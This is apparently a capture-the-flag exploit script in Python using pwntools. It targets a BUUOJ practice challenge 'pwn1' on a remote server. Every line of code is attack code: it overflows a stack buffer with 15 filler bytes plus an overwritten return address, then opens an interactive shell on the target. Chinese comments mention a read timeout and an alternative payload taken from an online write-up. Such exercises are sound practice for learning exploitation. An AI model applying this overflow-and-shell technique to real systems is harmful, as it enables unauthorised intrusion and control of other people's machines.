#!/usr/bin/env python
# coding=utf-8

from pwn import *

#p = process('./pwn1')
p = remote('node3.buuoj.cn', 26692)

#p.recvuntil("please input") 这道题不知道为啥recvuntil报连接超时。。
#buf = 'a' * (0xf + 0x8) + p64(0x401198) + p64(0x401186) 也可以，是网上wp的修改
buf_1 = 'a' * 15 + p64(0x401186)
#gdb.attach(p)

p.sendline(buf_1)

p.interactive()